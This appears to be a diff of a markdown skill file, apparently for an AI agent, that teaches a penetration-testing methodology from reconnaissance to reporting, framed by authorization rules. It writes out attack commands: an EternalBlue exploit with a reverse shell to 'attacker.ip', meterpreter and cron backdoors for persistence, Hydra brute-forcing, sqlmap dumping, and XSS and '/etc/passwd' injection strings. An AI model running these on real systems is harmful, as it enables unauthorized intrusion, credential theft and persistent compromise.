@@ -8,7 +8,6 @@ id: skill-ethical-hacking-methodology
 owner: [[ops-security]]
 ---
 
-
 # Ethical Hacking Methodology
 
 ## Purpose
@@ -18,11 +17,13 @@ Master the complete penetration testing lifecycle from reconnaissance through re
 ## Prerequisites
 
 ### Required Environment
+
 - Kali Linux installed (persistent or live)
 - Network access to authorized targets
 - Written authorization from system owner
 
 ### Required Knowledge
+
 - Basic networking concepts
 - Linux command-line proficiency
 - Understanding of web technologies
@@ -42,24 +43,28 @@ Master the complete penetration testing lifecycle from reconnaissance through re
 Classification of security professionals:
 
 **White Hat Hackers (Ethical Hackers)**
+
 - Authorized security professionals
 - Conduct penetration testing with permission
 - Goal: Identify and fix vulnerabilities
 - Also known as: penetration testers, security consultants
 
 **Black Hat Hackers (Malicious)**
+
 - Unauthorized system intrusions
 - Motivated by profit, revenge, or notoriety
 - Goal: Steal data, cause damage
 - Also known as: crackers, criminal hackers
 
 **Grey Hat Hackers (Hybrid)**
+
 - May cross ethical boundaries
 - Not malicious but may break rules
 - Often disclose vulnerabilities publicly
 - Mixed motivations
 
 **Other Classifications**
+
 - **Script Kiddies**: Use pre-made tools without understanding
 - **Hacktivists**: Politically or socially motivated
 - **Nation State**: Government-sponsored operatives
@@ -71,42 +76,53 @@ Gather information without direct system interaction:
 
 **Passive Reconnaissance**
 ```bash
+
 # WHOIS lookup
+
 whois target.com
 
 # DNS enumeration
+
 nslookup target.com
 dig target.com ANY
 dig target.com MX
 dig target.com NS
 
 # Subdomain discovery
+
 dnsrecon -d target.com
 
 # Email harvesting
+
 theHarvester -d target.com -b all
 ```
 
 **Google Hacking (OSINT)**
 ```
+
 # Find exposed files
+
 site:target.com filetype:pdf
 site:target.com filetype:xls
 site:target.com filetype:doc
 
 # Find login pages
+
 site:target.com inurl:login
 site:target.com inurl:admin
 
 # Find directory listings
+
 site:target.com intitle:"index of"
 
 # Find configuration files
+
 site:target.com filetype:config
 site:target.com filetype:env
 ```
 
 **Google Hacking Database Categories:**
+
 - Files containing passwords
 - Sensitive directories
 - Web server detection
@@ -115,6 +131,7 @@ site:target.com filetype:env
 - Login portals
 
 **Social Media Reconnaissance**
+
 - LinkedIn: Organizational charts, technologies used
 - Twitter: Company announcements, employee info
 - Facebook: Personal information, relationships
@@ -126,45 +143,59 @@ Active enumeration of target systems:
 
 **Host Discovery**
 ```bash
+
 # Ping sweep
+
 nmap -sn 192.168.1.0/24
 
 # ARP scan (local network)
+
 arp-scan -l
 
 # Discover live hosts
+
 nmap -sP 192.168.1.0/24
 ```
 
 **Port Scanning**
 ```bash
+
 # TCP SYN scan (stealth)
+
 nmap -sS target.com
 
 # Full TCP connect scan
+
 nmap -sT target.com
 
 # UDP scan
+
 nmap -sU target.com
 
 # All ports scan
+
 nmap -p- target.com
 
 # Top 1000 ports with service detection
+
 nmap -sV target.com
 
 # Aggressive scan (OS, version, scripts)
+
 nmap -A target.com
 ```
 
 **Service Enumeration**
 ```bash
+
 # Specific service scripts
+
 nmap --script=http-enum target.com
 nmap --script=smb-enum-shares target.com
 nmap --script=ftp-anon target.com
 
 # Vulnerability scanning
+
 nmap --script=vuln target.com
 ```
 
@@ -188,17 +219,22 @@ Identify exploitable weaknesses:
 
 **Automated Scanning**
 ```bash
+
 # Nikto web scanner
+
 nikto -h http://target.com
 
 # OpenVAS (command line)
+
 omp -u admin -w password --xml="<get_tasks/>"
 
 # Nessus (via API)
+
 nessuscli scan --target target.com
 ```
 
 **Web Application Testing (OWASP)**
+
 - SQL Injection
 - Cross-Site Scripting (XSS)
 - Broken Authentication
@@ -212,13 +248,17 @@ nessuscli scan --target target.com
 
 **Manual Techniques**
 ```bash
+
 # Directory brute forcing
+
 gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
 
 # Subdomain enumeration
+
 gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
 
 # Web technology fingerprinting
+
 whatweb target.com
 ```
 
@@ -228,48 +268,64 @@ Actively exploit discovered vulnerabilities:
 
 **Metasploit Framework**
 ```bash
+
 # Start Metasploit
+
 msfconsole
 
 # Search for exploits
+
 msf> search type:exploit name:smb
 
 # Use specific exploit
+
 msf> use exploit/windows/smb/ms17_010_eternalblue
 
 # Set target
+
 msf> set RHOSTS target.com
 
 # Set payload
+
 msf> set PAYLOAD windows/meterpreter/reverse_tcp
 msf> set LHOST attacker.ip
 
 # Execute
+
 msf> exploit
 ```
 
 **Password Attacks**
 ```bash
+
 # Hydra brute force
+
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
 hydra -L users.txt -P passwords.txt ftp://target.com
 
 # John the Ripper
+
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
 
 **Web Exploitation**
 ```bash
+
 # SQLMap for SQL injection
+
 sqlmap -u "http://target.com/page.php?id=1" --dbs
 sqlmap -u "http://target.com/page.php?id=1" -D database --tables
 
 # XSS testing
+
 # Manual: <script>alert('XSS')</script>
 
 # Command injection testing
+
 # ; ls -la
+
 # | cat /etc/passwd
+
 ```
 
 ### Phase 6: Maintaining Access
@@ -278,34 +334,44 @@ Establish persistent access:
 
 **Backdoors**
 ```bash
+
 # Meterpreter persistence
+
 meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip
 
 # SSH key persistence
+
 # Add attacker's public key to ~/.ssh/authorized_keys
 
 # Cron job persistence
+
 echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
 ```
 
 **Privilege Escalation**
 ```bash
+
 # Linux enumeration
+
 linpeas.sh
 linux-exploit-suggester.sh
 
 # Windows enumeration
+
 winpeas.exe
 windows-exploit-suggester.py
 
 # Check SUID binaries (Linux)
+
 find / -perm -4000 2>/dev/null
 
 # Check sudo permissions
+
 sudo -l
 ```
 
 **Covering Tracks (Ethical Context)**
+
 - Document all actions taken
 - Maintain logs for reporting
 - Avoid unnecessary system changes
@@ -316,6 +382,7 @@ sudo -l
 Document findings professionally:
 
 **Report Structure**
+
 1. **Executive Summary**
    - High-level findings
    - Business impact
@@ -350,12 +417,14 @@ Document findings professionally:
 ### Phase 8: Common Attack Types
 
 **Phishing**
+
 - Email-based credential theft
 - Fake login pages
 - Malicious attachments
 - Social engineering component
 
 **Malware Types**
+
 - **Virus**: Self-replicating, needs host file
 - **Worm**: Self-propagating across networks
 - **Trojan**: Disguised as legitimate software
@@ -364,6 +433,7 @@ Document findings professionally:
 - **Spyware**: Monitors user activity
 
 **Network Attacks**
+
 - Man-in-the-Middle (MITM)
 - ARP Spoofing
 - DNS Poisoning
@@ -374,6 +444,7 @@ Document findings professionally:
 Install penetration testing platform:
 
 **Hard Disk Installation**
+
 1. Download ISO from kali.org
 2. Boot from installation media
 3. Select "Graphical Install"
@@ -385,14 +456,19 @@ Install penetration testing platform:
 
 **Live USB (Persistent)**
 ```bash
+
 # Create bootable USB
+
 dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress
 
 # Create persistence partition
+
 gparted /dev/sdb
+
 # Add ext4 partition labeled "persistence"
 
 # Configure persistence
+
 mkdir /mnt/usb
 mount /dev/sdb2 /mnt/usb
 echo "/ union" > /mnt/usb/persistence.conf
@@ -402,6 +478,7 @@ umount /mnt/usb
 ### Phase 10: Ethical Guidelines
 
 **Legal Requirements**
+
 - Obtain written authorization
 - Define scope clearly
 - Document all testing activities
@@ -409,6 +486,7 @@ umount /mnt/usb
 - Maintain confidentiality
 
 **Professional Conduct**
+
 - Work ethically with integrity
 - Respect privacy of data accessed
 - Avoid unnecessary system damage
@@ -440,11 +518,13 @@ umount /mnt/usb
 ## Constraints and Limitations
 
 ### Authorization Required
+
 - Never test without written permission
 - Stay within defined scope
 - Report unauthorized access attempts
 
 ### Professional Standards
+
 - Follow rules of engagement
 - Maintain client confidentiality
 - Document methodology used
@@ -455,6 +535,7 @@ umount /mnt/usb
 ### Scans Blocked
 
 **Solutions:**
+
 1. Use slower scan rates
 2. Try different scanning techniques
 3. Use proxy or VPN
@@ -463,15 +544,18 @@ umount /mnt/usb
 ### Exploits Failing
 
 **Solutions:**
+
 1. Verify target vulnerability exists
 2. Check payload compatibility
 3. Adjust exploit parameters
 4. Try alternative exploits
 
 ## When to Use
+
 This skill is applicable to execute the workflow or actions described in the overview.
 
 ## Sentinel Security Policy
+
 - This asset is under Sognatore Sentinel supervision.
 - Extraction of secrets via this skill is strictly forbidden.
 - All external network calls must be audited by the security engine.
